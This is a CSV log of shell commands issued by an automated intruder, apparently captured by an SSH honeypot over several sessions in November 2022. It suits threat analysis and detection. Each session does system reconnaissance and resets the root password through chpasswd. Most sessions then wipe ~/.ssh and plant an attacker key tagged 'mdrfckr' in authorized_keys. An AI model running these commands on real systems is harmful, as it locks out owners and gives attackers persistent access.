id,session,timestamp,realm,input
32482,e3165c1b5f03,2022-11-18T12:17:36.589460Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
32483,326e776c6116,2022-11-18T12:17:39.477088Z,,"cat /proc/cpuinfo | grep name | wc -l"
32484,326e776c6116,2022-11-18T12:17:39.893464Z,,"echo ""root:bjBskMXbk9CL""|chpasswd|bash"
32485,326e776c6116,2022-11-18T12:17:40.436249Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
32486,326e776c6116,2022-11-18T12:17:40.908234Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
32487,326e776c6116,2022-11-18T12:17:41.320883Z,,"which ls"
32488,326e776c6116,2022-11-18T12:17:41.320160Z,,"ls -lh $(which ls)"
32489,326e776c6116,2022-11-18T12:17:41.822944Z,,"crontab -l"
32490,326e776c6116,2022-11-18T12:17:42.235984Z,,w
32491,326e776c6116,2022-11-18T12:17:42.738147Z,,"uname -m"
32492,326e776c6116,2022-11-18T12:17:43.213711Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
32493,326e776c6116,2022-11-18T12:17:43.647166Z,,top
32494,326e776c6116,2022-11-18T12:17:44.153526Z,,uname
32495,326e776c6116,2022-11-18T12:17:44.646971Z,,"uname -a"
32496,326e776c6116,2022-11-18T12:17:45.078320Z,,"lscpu | grep Model"
32497,326e776c6116,2022-11-18T12:17:45.579203Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
32498,526ecf462076,2022-11-18T12:18:16.646479Z,,"cat /proc/cpuinfo | grep name | wc -l"
32499,526ecf462076,2022-11-18T12:18:17.295979Z,,"echo ""root:FFnr6F7hFyFo""|chpasswd|bash"
32500,526ecf462076,2022-11-18T12:18:17.894876Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
32501,526ecf462076,2022-11-18T12:18:18.452593Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
32502,526ecf462076,2022-11-18T12:18:19.093533Z,,"which ls"
32503,526ecf462076,2022-11-18T12:18:19.092287Z,,"ls -lh $(which ls)"
32504,526ecf462076,2022-11-18T12:18:19.656376Z,,"crontab -l"
32505,526ecf462076,2022-11-18T12:18:20.300450Z,,w
32506,526ecf462076,2022-11-18T12:18:20.899810Z,,"uname -m"
32507,526ecf462076,2022-11-18T12:18:21.458575Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
32508,526ecf462076,2022-11-18T12:18:22.098762Z,,top
32509,526ecf462076,2022-11-18T12:18:22.657830Z,,uname
32510,526ecf462076,2022-11-18T12:18:23.297756Z,,"uname -a"
32511,526ecf462076,2022-11-18T12:18:23.896435Z,,"lscpu | grep Model"
32512,526ecf462076,2022-11-18T12:18:24.456694Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
32513,42acf556f3db,2022-11-18T12:19:14.410816Z,,"cat /proc/cpuinfo | grep name | wc -l"
32514,42acf556f3db,2022-11-18T12:19:15.012014Z,,"echo ""root:9Lxwy0jTTPok""|chpasswd|bash"
32515,42acf556f3db,2022-11-18T12:19:15.571137Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
32516,42acf556f3db,2022-11-18T12:19:16.214410Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
32517,42acf556f3db,2022-11-18T12:19:16.777350Z,,"which ls"
32518,42acf556f3db,2022-11-18T12:19:16.776673Z,,"ls -lh $(which ls)"
32519,42acf556f3db,2022-11-18T12:19:17.414001Z,,"crontab -l"
32520,42acf556f3db,2022-11-18T12:19:18.015476Z,,w
32521,42acf556f3db,2022-11-18T12:19:18.577799Z,,"uname -m"
32522,42acf556f3db,2022-11-18T12:19:19.218934Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
32523,42acf556f3db,2022-11-18T12:19:19.781415Z,,top
32524,42acf556f3db,2022-11-18T12:19:20.417990Z,,uname
32525,42acf556f3db,2022-11-18T12:19:21.018882Z,,"uname -a"
32526,42acf556f3db,2022-11-18T12:19:21.586871Z,,"lscpu | grep Model"
32527,42acf556f3db,2022-11-18T12:19:22.228119Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
32528,fa707460405b,2022-11-18T12:19:34.944604Z,,"cat /proc/cpuinfo | grep name | wc -l"
32529,fa707460405b,2022-11-18T12:19:35.587582Z,,"echo ""root:BXntW39cL4pA""|chpasswd|bash"
32530,fa707460405b,2022-11-18T12:19:36.177673Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
32531,fa707460405b,2022-11-18T12:19:36.728442Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
32532,fa707460405b,2022-11-18T12:19:37.354420Z,,"which ls"
32533,fa707460405b,2022-11-18T12:19:37.353531Z,,"ls -lh $(which ls)"
32534,fa707460405b,2022-11-18T12:19:37.948482Z,,"crontab -l"
32535,fa707460405b,2022-11-18T12:19:38.503156Z,,w
32536,fa707460405b,2022-11-18T12:19:39.133476Z,,"uname -m"
32537,fa707460405b,2022-11-18T12:19:40.067064Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
32538,fa707460405b,2022-11-18T12:19:40.695262Z,,top
32539,fa707460405b,2022-11-18T12:19:41.519941Z,,uname
32540,fa707460405b,2022-11-18T12:19:42.594314Z,,"uname -a"
32541,cfc07bb05eb5,2022-11-18T12:19:42.830787Z,,"cat /proc/cpuinfo | grep name | wc -l"
32542,fa707460405b,2022-11-18T12:19:43.186927Z,,"lscpu | grep Model"
32543,fa707460405b,2022-11-18T12:19:43.834542Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
32544,cfc07bb05eb5,2022-11-18T12:19:45.087403Z,,"echo ""root:em96rGUQAz4v""|chpasswd|bash"
32545,cfc07bb05eb5,2022-11-18T12:19:46.061768Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
32546,cfc07bb05eb5,2022-11-18T12:19:46.846485Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
32547,cfc07bb05eb5,2022-11-18T12:19:47.559222Z,,"which ls"
32548,cfc07bb05eb5,2022-11-18T12:19:47.558357Z,,"ls -lh $(which ls)"
32549,cfc07bb05eb5,2022-11-18T12:19:48.338495Z,,"crontab -l"
32550,cfc07bb05eb5,2022-11-18T12:19:49.084687Z,,w
32551,cfc07bb05eb5,2022-11-18T12:19:49.792049Z,,"uname -m"
32552,cfc07bb05eb5,2022-11-18T12:19:50.574979Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
32553,cfc07bb05eb5,2022-11-18T12:19:51.278594Z,,top
32554,cfc07bb05eb5,2022-11-18T12:19:52.056801Z,,uname
32555,cfc07bb05eb5,2022-11-18T12:19:52.797768Z,,"uname -a"
32556,cfc07bb05eb5,2022-11-18T12:19:53.500649Z,,"lscpu | grep Model"
32557,cfc07bb05eb5,2022-11-18T12:19:54.286872Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
32558,b7d58b8149c2,2022-11-18T12:20:33.340510Z,,"cat /proc/cpuinfo | grep name | wc -l"
32559,b7d58b8149c2,2022-11-18T12:20:33.884911Z,,"echo ""root:9rdLp6c9mqbL""|chpasswd|bash"
32560,b7d58b8149c2,2022-11-18T12:20:34.501809Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
32561,b7d58b8149c2,2022-11-18T12:20:35.043310Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
32562,b7d58b8149c2,2022-11-18T12:20:35.659360Z,,"which ls"
32563,b7d58b8149c2,2022-11-18T12:20:35.658646Z,,"ls -lh $(which ls)"
32564,b7d58b8149c2,2022-11-18T12:20:36.240243Z,,"crontab -l"
32565,b7d58b8149c2,2022-11-18T12:20:36.783311Z,,w
32566,b7d58b8149c2,2022-11-18T12:20:37.399297Z,,"uname -m"
32567,b7d58b8149c2,2022-11-18T12:20:37.937134Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
32568,b7d58b8149c2,2022-11-18T12:20:38.564467Z,,top
32569,b7d58b8149c2,2022-11-18T12:20:39.144435Z,,uname
32570,b7d58b8149c2,2022-11-18T12:20:39.689246Z,,"uname -a"
32571,b7d58b8149c2,2022-11-18T12:20:40.314555Z,,"lscpu | grep Model"
32572,b7d58b8149c2,2022-11-18T12:20:40.864697Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
32573,043d7d9ae259,2022-11-18T12:20:52.534385Z,,"cat /proc/cpuinfo | grep name | wc -l"
32574,043d7d9ae259,2022-11-18T12:20:53.126985Z,,"echo ""root:2ofgUj3VyfgJ""|chpasswd|bash"
32575,043d7d9ae259,2022-11-18T12:20:53.677885Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
32576,043d7d9ae259,2022-11-18T12:20:54.311609Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
32577,043d7d9ae259,2022-11-18T12:20:54.909939Z,,"which ls"
32578,043d7d9ae259,2022-11-18T12:20:54.909169Z,,"ls -lh $(which ls)"
32579,043d7d9ae259,2022-11-18T12:20:55.463432Z,,"crontab -l"
32580,043d7d9ae259,2022-11-18T12:20:56.098028Z,,w
32581,043d7d9ae259,2022-11-18T12:20:56.654145Z,,"uname -m"
32582,043d7d9ae259,2022-11-18T12:20:57.294893Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
32583,043d7d9ae259,2022-11-18T12:20:57.888456Z,,top
32584,043d7d9ae259,2022-11-18T12:20:58.442772Z,,uname
32585,043d7d9ae259,2022-11-18T12:20:59.090826Z,,"uname -a"
32586,043d7d9ae259,2022-11-18T12:20:59.647318Z,,"lscpu | grep Model"
32587,043d7d9ae259,2022-11-18T12:21:00.279608Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
32588,19864631051f,2022-11-18T12:22:12.069251Z,,"cat /proc/cpuinfo | grep name | wc -l"
32589,19864631051f,2022-11-18T12:22:12.627423Z,,"echo ""root:xiGiVJLugf8s""|chpasswd|bash"
32590,19864631051f,2022-11-18T12:22:13.258875Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
32591,19864631051f,2022-11-18T12:22:13.819684Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
32592,19864631051f,2022-11-18T12:22:14.460680Z,,"which ls"
32593,19864631051f,2022-11-18T12:22:14.459823Z,,"ls -lh $(which ls)"
32594,19864631051f,2022-11-18T12:22:15.055979Z,,"crontab -l"
32595,19864631051f,2022-11-18T12:22:15.615972Z,,w
32596,19864631051f,2022-11-18T12:22:16.252065Z,,"uname -m"
32597,19864631051f,2022-11-18T12:22:16.848986Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
32598,19864631051f,2022-11-18T12:22:17.411136Z,,top
32599,19864631051f,2022-11-18T12:22:18.046825Z,,uname
32600,19864631051f,2022-11-18T12:22:18.605547Z,,"uname -a"
32601,19864631051f,2022-11-18T12:22:19.239590Z,,"lscpu | grep Model"
32602,19864631051f,2022-11-18T12:22:19.838378Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
32603,b5bff6b02371,2022-11-18T12:23:32.630526Z,,"cat /proc/cpuinfo | grep name | wc -l"
32604,b5bff6b02371,2022-11-18T12:23:33.271934Z,,"echo ""root:vj6MhLDuJqje""|chpasswd|bash"
32605,b5bff6b02371,2022-11-18T12:23:33.828067Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
32606,b5bff6b02371,2022-11-18T12:23:34.454419Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
32607,b5bff6b02371,2022-11-18T12:23:35.048299Z,,"which ls"
32608,b5bff6b02371,2022-11-18T12:23:35.047551Z,,"ls -lh $(which ls)"
32609,b5bff6b02371,2022-11-18T12:23:35.602634Z,,"crontab -l"
32610,b5bff6b02371,2022-11-18T12:23:36.245781Z,,w
32611,b5bff6b02371,2022-11-18T12:23:36.803487Z,,"uname -m"
32612,b5bff6b02371,2022-11-18T12:23:37.433744Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
32613,b5bff6b02371,2022-11-18T12:23:38.027315Z,,top
32614,b5bff6b02371,2022-11-18T12:23:38.591336Z,,uname
32615,b5bff6b02371,2022-11-18T12:23:39.224443Z,,"uname -a"
32616,b5bff6b02371,2022-11-18T12:23:39.821971Z,,"lscpu | grep Model"
32617,b5bff6b02371,2022-11-18T12:23:40.376827Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
32618,0eea9744b7f2,2022-11-18T12:24:56.199279Z,,"cat /proc/cpuinfo | grep name | wc -l"
32619,0eea9744b7f2,2022-11-18T12:24:56.753479Z,,"echo ""root:vqjUTnQ61SkT""|chpasswd|bash"
32620,0eea9744b7f2,2022-11-18T12:24:57.384947Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
32621,0eea9744b7f2,2022-11-18T12:24:57.976024Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
32622,0eea9744b7f2,2022-11-18T12:24:58.531924Z,,"which ls"
32623,0eea9744b7f2,2022-11-18T12:24:58.530926Z,,"ls -lh $(which ls)"
32624,0eea9744b7f2,2022-11-18T12:24:59.166307Z,,"crontab -l"
32625,0eea9744b7f2,2022-11-18T12:24:59.719044Z,,w
32626,0eea9744b7f2,2022-11-18T12:25:00.934984Z,,"uname -m"
32627,0eea9744b7f2,2022-11-18T12:25:01.527159Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
32628,0eea9744b7f2,2022-11-18T12:25:02.498727Z,,top
32629,0eea9744b7f2,2022-11-18T12:25:03.129553Z,,uname
32630,0eea9744b7f2,2022-11-18T12:25:03.685028Z,,"uname -a"
32631,0eea9744b7f2,2022-11-18T12:25:04.318700Z,,"lscpu | grep Model"
32632,0eea9744b7f2,2022-11-18T12:25:04.908744Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
32633,b61ebc030617,2022-11-18T12:26:07.718069Z,,"cat /proc/cpuinfo | grep name | wc -l"
32634,b61ebc030617,2022-11-18T12:26:08.363459Z,,"echo ""root:cXEIWW8fqujD""|chpasswd|bash"
32635,b61ebc030617,2022-11-18T12:26:08.951036Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
32636,b61ebc030617,2022-11-18T12:26:09.500102Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
32637,b61ebc030617,2022-11-18T12:26:10.130111Z,,"which ls"
32638,b61ebc030617,2022-11-18T12:26:10.129324Z,,"ls -lh $(which ls)"
32639,b61ebc030617,2022-11-18T12:26:10.679164Z,,"crontab -l"
32640,b61ebc030617,2022-11-18T12:26:11.301666Z,,w
32641,b61ebc030617,2022-11-18T12:26:11.893428Z,,"uname -m"
32642,b61ebc030617,2022-11-18T12:26:12.444043Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
32643,b61ebc030617,2022-11-18T12:26:13.076399Z,,top
32644,b61ebc030617,2022-11-18T12:26:13.627998Z,,uname
32645,b61ebc030617,2022-11-18T12:26:14.256014Z,,"uname -a"
32646,b61ebc030617,2022-11-18T12:26:14.847635Z,,"lscpu | grep Model"
32647,b61ebc030617,2022-11-18T12:26:15.396893Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
32648,321355b88484,2022-11-18T12:27:41.640933Z,,"cat /proc/cpuinfo | grep name | wc -l"
32649,321355b88484,2022-11-18T12:27:42.199016Z,,"echo ""root:6zvdV65hKjdB""|chpasswd|bash"
32650,321355b88484,2022-11-18T12:27:42.831831Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
32651,321355b88484,2022-11-18T12:27:43.427467Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
32652,321355b88484,2022-11-18T12:27:43.988732Z,,"which ls"
32653,321355b88484,2022-11-18T12:27:43.987767Z,,"ls -lh $(which ls)"
32654,321355b88484,2022-11-18T12:27:44.625971Z,,"crontab -l"
32655,321355b88484,2022-11-18T12:27:45.184499Z,,w
32656,321355b88484,2022-11-18T12:27:45.815464Z,,"uname -m"
32657,321355b88484,2022-11-18T12:27:46.411741Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
32658,321355b88484,2022-11-18T12:27:46.970376Z,,top
32659,321355b88484,2022-11-18T12:27:47.602211Z,,uname
32660,321355b88484,2022-11-18T12:27:48.202770Z,,"uname -a"
32661,321355b88484,2022-11-18T12:27:48.762156Z,,"lscpu | grep Model"
32662,321355b88484,2022-11-18T12:27:49.399994Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
32663,cbf1519030f2,2022-11-18T12:28:55.021339Z,,"cat /proc/cpuinfo | grep name | wc -l"
